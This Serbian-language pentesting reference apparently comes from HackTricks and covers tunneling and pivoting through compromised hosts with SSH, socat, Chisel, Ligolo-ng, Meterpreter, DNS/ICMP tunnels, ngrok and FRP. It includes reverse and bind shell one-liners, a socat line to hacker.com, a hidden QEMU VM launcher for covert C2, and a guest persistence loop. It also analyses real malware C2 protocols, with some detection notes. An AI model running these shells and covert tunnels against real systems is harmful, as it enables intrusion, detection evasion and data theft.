# Tunelovanje i prosleđivanje portova

{{#include ../banners/hacktricks-training.md}}

## Nmap savet

> [!WARNING]
> **ICMP** i **SYN** skenovi ne mogu da se tuneliraju kroz socks proxies, zato moramo **onemogućiti otkrivanje pinga** (`-Pn`) i navesti **TCP skenove** (`-sT`) da bi ovo funkcionisalo.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafička veza (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Otvorite novi Port na SSH Serveru --> Drugi port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalni port --> Kompromitovani host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Bilo gde
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Ovo je korisno za dobijanje reverse shells sa internal hosts kroz DMZ na vaš host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Potrebate **root na oba uređaja** (jer ćete kreirati nove interfejse) i konfiguracija sshd mora omogućiti root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Omogućite forwarding na Server strani
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Postavi novu rutu na klijentskoj strani
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Bezbednost – Terrapin Attack (CVE-2023-48795)**
> Napad downgrade Terrapin iz 2023. može dozvoliti man-in-the-middle da manipuliše ranim SSH handshake-om i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive algoritme `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tunel.

## SSHUTTLE

Možete **tunelovati** putem **ssh** sav **saobraćaj** ka **podmreži** kroz host.\
Na primer, prosleđivanje celog saobraćaja koji ide ka 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Povežite se pomoću privatnog ključa
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokalni port --> Kompromitovan host (active session) --> Treća_mašina:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Još jedan način:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Otvorite port na teamserveru koji osluškuje na svim interfejsima i koji se može koristiti za **usmeravanje saobraćaja kroz beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> U ovom slučaju, **port is opened in the beacon host**, ne u Team Server i saobraćaj se šalje na Team Server i odatle do naznačenog host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Napomena:

- Beacon's reverse port forward je dizajniran da **tuneluje saobraćaj ka Team Server, a ne za prosleđivanje između pojedinačnih mašina**.
- Saobraćaj se **tuneluje unutar Beacon's C2 traffic**, uključujući P2P links.
- **Admin privileges are not required** za kreiranje reverse port forwards na high ports.

### rPort2Port local

> [!WARNING]
> U ovom slučaju, **port se otvara na beacon host**, ne na Team Server i **saobraćaj se šalje ka Cobalt Strike client** (ne na Team Server) i odatle do naznačenog host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Potrebno je da otpremite web fajl tunel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Možete ga preuzeti sa releases stranice [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Treba da koristite **istu verziju za client i server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Prosleđivanje portova
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Koristite istu verziju za agent i proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vezivanje i osluškivanje agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Pristup lokalnim portovima agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunel se pokreće sa žrtvine mašine.\
socks4 proxy se kreira na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kroz **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port preko socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kroz SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Možete zaobići **non-authenticated proxy** tako što ćete izvršiti ovu liniju umesto poslednje u victim's console:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Kreirajte sertifikate na obe strane: Client i Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Povežite lokalni SSH port (22) sa portom 443 hosta napadača
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Deluje kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).

Pošto će ovaj binarni fajl biti izvršen na žrtvi i predstavlja ssh klijent, moramo otvoriti naš ssh servis i port kako bismo uspostavili reverse connection. Zatim, da bismo prosledili samo lokalno dostupan port na port na našoj mašini:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Morate biti local admin (za bilo koji port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Potrebno je imati **RDP pristup sistemu**.\
Preuzmite:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz Remote Desktop Service funkcije u Windowsu. DVC je odgovoran za **tunelovanje paketa preko RDP konekcije**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na svom klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** ovako:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sada možemo da se **connect** sa **victim** preko **RDP** koristeći **`mstsc.exe`**, i trebalo bi da dobijemo **prompt** koji kaže da je **SocksOverRDP plugin is enabled**, i da će **listen** na **127.0.0.1:1080**.

**Connect** via **RDP** i otpremite i izvršite na **victim** mašini binarni fajl `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sada potvrdite na vašem računaru (attacker) da port 1080 sluša:
```
netstat -antb | findstr 1080
```
Now you can use [**Proxifier**](https://www.proxifier.com/) **da prosledite saobraćaj preko tog porta.**

## Proksifikujte Windows GUI aplikacije

Možete naterati Windows GUI aplikacije da koriste proxy koristeći [**Proxifier**](https://www.proxifier.com/).\
U **Profile -> Proxy Servers** dodajte IP i port SOCKS servera.\
U **Profile -> Proxification Rules** dodajte ime programa koji želite proksifikovati i konekcije prema IP adresama koje želite proksifikovati.

## Zaobilaženje NTLM proxy-ja

Prethodno pomenuti alat: **Rpivot**\
**OpenVPN** takođe može to zaobići, podešavanjem sledećih opcija u konfig fajlu:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autentifikuje se prema proxy i vezuje port lokalno koji se preusmerava na eksternu uslugu koju navedete. Zatim možete koristiti alat po izboru kroz ovaj port.\
Na primer, to preusmerava port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sada, ako na primer na victim postaviš **SSH** da sluša na portu 443, možeš se povezati na njega preko attacker porta 2222.\
Takođe, možeš koristiti **meterpreter** koji se povezuje na localhost:443 dok attacker sluša na portu 2222.

## YARP

Reverse proxy koji je napravio Microsoft. Možeš ga naći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root je potreban na oba sistema da bi se kreirali tun adapteri i tunelovali podaci između njih koristeći DNS upite.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel će biti veoma spor. Možete napraviti kompresovanu SSH konekciju kroz ovaj tunel korišćenjem:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Uspostavlja C\&C kanal preko DNS-a. Ne zahteva root privilegije.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **U PowerShell-u**

Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) da pokrenete dnscat2 client u PowerShell-u:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Preusmeravanje portova pomoću dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Promena DNS-a u proxychains

Proxychains presreće `gethostbyname` libc poziv i tuneluje TCP DNS zahteve kroz socks proxy. Po podrazumevanom, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodirano). Da biste promenili, izmenite fajl: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows environment** možete podesiti IP **domain controller**.

## Tuneli u Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Prilagođeni DNS TXT / HTTP JSON C2 (AK47C2)

Akter Storm-2603 je kreirao **dual-channel C2 ("AK47C2")** koji zloupotrebljava *samo* outbound **DNS** i **plain HTTP POST** saobraćaj – dva protokola koja se retko blokiraju na korporativnim mrežama.

1. **DNS režim (AK47DNS)**
• Generiše nasumičan 5-karakterni SessionID (npr. `H4T14`).
• Dodaje `1` za zahteve zadataka (task requests) ili `2` za rezultate i konkatenira različita polja (flags, SessionID, computer name).
• Svako polje je **XOR-enkriptovano ASCII ključem `VHBD@H`**, hex-enkodovano i spojeno tačkama – na kraju se završava domenom koji kontroliše napadač:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Zahtevi koriste `DnsQuery()` za **TXT** (i rezervno **MG**) zapise.
• Kada odgovor prelazi 0xFF bajtova, backdoor **fragmentuje** podatke u delove od 63 bajta i ubacuje markere:
`s<SessionID>t<TOTAL>p<POS>` tako da C2 server može da ih ponovo složi.

2. **HTTP režim (AK47HTTP)**
• Sastavlja JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Cela blob poruka se XOR-uje sa `VHBD@H` → hex → šalje se kao telo **`POST /`** sa headerom `Content-Type: text/plain`.
• Odgovor koristi isti enkoding i polje `cmd` se izvršava komandom `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Potražite neobične **TXT upite** čiji prvi label je dugačak heksadecimalni niz i koji se uvek završavaju na jednom retkom domenu.
• Konstantan XOR ključ praćen ASCII-hexom se lako detektuje YARA-om: `6?56484244?484` (`VHBD@H` in hex).
• Za HTTP, označite text/plain POST tela koja su čisti hex i čija je dužina u bajtovima deljiva sa 2.

{{#note}}
Ceo kanal se uklapa unutar **standardnih RFC-kompatibilnih upita** i održava svaku oznaku poddomena ispod 63 bajta, što ga čini neupadljivim u većini DNS logova.
{{#endnote}}

## ICMP tunelovanje

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Potrebne su root privilegije na obe strane da bi se kreirali tun adapteri i tunelovali podaci između njih koristeći ICMP echo zahteve.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Preuzmite ga ovde**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **je alat za izlaganje servisa na Internet iz jedne komandne linije.**\
_URI za izlaganje izgledaju ovako:_ **UID.ngrok.io**

### Instalacija

- Kreirajte nalog: https://ngrok.com/signup
- Preuzimanje klijenta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Osnovna upotreba

**Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Takođe je moguće dodati autentifikaciju i TLS, ako je potrebno._

#### Tunelovanje TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Izlaganje fajlova putem HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Korisno za XSS,SSRF,SSTI ..._\  
Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml jednostavan primer konfiguracije

Otvara 3 tunela:

- 2 TCP
- 1 HTTP koji izlaže statičke fajlove iz /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Demon `cloudflared` kompanije Cloudflare može da kreira odlazne tunele koji izlažu **lokalne TCP/UDP servise** bez potrebe za dolaznim pravilima vatrozida, koristeći Cloudflare’s edge kao tačku susreta. Ovo je veoma praktično kada vatrozid za izlazni saobraćaj dozvoljava samo HTTPS saobraćaj, ali su dolazne konekcije blokirane.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Trajni tunnels sa DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Pokrenite konektor:
```bash
cloudflared tunnel run mytunnel
```
Pošto sav saobraćaj napušta host **outbound over 443**, Cloudflared tuneli su jednostavan način za zaobilaženje ingress ACLs ili NAT boundaries. Imajte na umu da binary obično radi sa povišenim privilegijama – koristite kontejnere ili `--user` flag kad god je to moguće.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) je aktivno održavan Go reverse-proxy koji podržava **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Počevši od **v0.53.0 (May 2024)** može da radi kao **SSH Tunnel Gateway**, tako da ciljni host može da podigne reverse tunel koristeći samo standardni OpenSSH client – nije potreban dodatni binary.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Korišćenje novog SSH gateway-a (bez frpc binarnog fajla)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez postavljanja dodatnih alata – idealno za living-off-the-land pivoting.

## Tajni tuneli zasnovani na VM pomoću QEMU

QEMU’s user-mode networking (`-netdev user`) podržava opciju nazvanu `hostfwd` koja **vezuje TCP/UDP port na *host* i prosleđuje ga u *guest***. Kada *guest* pokrene full SSH daemon, pravilo `hostfwd` vam daje disposable SSH jump box koji živi u potpunosti unutar ephemeral VM-a – savršeno za skrivanje C2 saobraćaja od EDR jer sva zlonamerna aktivnost i fajlovi ostaju na virtuelnom disku.

### Kratki one-liner
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Komanda iznad pokreće Tiny Core Linux sliku (`tc.qcow2`) u RAM-u.
• Port **2222/tcp** na Windows hostu je transparentno prosleđen na **22/tcp** unutar gosta.
• Iz ugla napadača cilj jednostavno izlaže port 2222; svi paketi koji ga dostignu obrađuju se od strane SSH servera koji radi u VM-u.

### Pokretanje prikriveno pomoću VBScript-a
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Pokretanje skripte sa `cscript.exe //B update.vbs` ostavlja prozor skrivenim.

### Persistencija unutar gostujućeg sistema

Zbog toga što je Tiny Core stateless, napadači obično:

1. Postave payload u `/opt/123.out`
2. Dodaju u `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Dodaju `home/tc` i `opt` u `/opt/filetool.lst` tako da se payload spakuje u `mydata.tgz` pri gašenju.

### Zašto ovo izbegava otkrivanje

• Samo dva unsigned executable-a (`qemu-system-*.exe`) dodiruju disk; nijedni drajveri ili servisi nisu instalirani.  
• Security proizvodi na hostu vide **bezopasan loopback saobraćaj** (stvarni C2 završava unutar VM-a).  
• Memory skeneri nikada ne analiziraju maliciozni process space jer živi u drugom OS-u.

### Saveti za odbranu

• Alertujte na **neočekivane QEMU/VirtualBox/KVM binarije** u putanjama koje su pisive od strane korisnika.  
• Blokirajte outbound konekcije koje potiču iz `qemu-system*.exe`.  
• Hunt-ujte za retkim portovima koji slušaju (2222, 10022, …) koji se vezuju odmah nakon pokretanja QEMU.

## IIS/HTTP.sys relay čvorovi preko `HttpAddUrl` (ShadowPad)

Ink Dragon’s ShadowPad IIS modul pretvara svaki kompromitovani perimeter web server u dvofunkcijski **backdoor + relay** tako što vezuje covert URL prefikse direktno na HTTP.sys sloju:

* **Config defaults** – ako JSON konfiguracija modula izostavi vrednosti, on pada na verodostojne IIS podrazumevane vrednosti (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Na taj način IIS odgovara na bezopasan saobraćaj sa odgovarajućim brendingom.
* **Wildcard interception** – operatori dostavljaju listu URL prefiksa razdvojenih tačka-zarezom (wildcards u host + path). Modul poziva `HttpAddUrl` za svaki unos, tako da HTTP.sys rutira odgovarajuće zahteve ka malicioznom handleru *pre* nego što zahtev stigne do IIS modula.
* **Encrypted first packet** – prva dva bajta tela zahteva nose seed za custom 32-bit PRNG. Svaki naredni bajt se XOR-uje sa generisanim keystream-om pre parsiranja protokola:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – modul održava dve liste: “servers” (upstream čvorovi) i “clients” (downstream implantati). Unosi se obrezuju ako heartbeat ne stigne u roku od ~30 sekundi. Kada su obe liste neprazne, sparuje prvi zdrav server sa prvim zdravim klientom i prosto prosleđuje bajtove između njihovih soketa dok se jedna strana ne zatvori.
* **Debug telemetry** – opciono logovanje beleži source IP, destination IP i ukupno prosleđene bajtove za svako sparivanje. Istražitelji su koristili te tragove da rekonstruišu ShadowPad mrežu koja obuhvata više žrtava.

---

## Ostali alati za proveru

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Reference

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
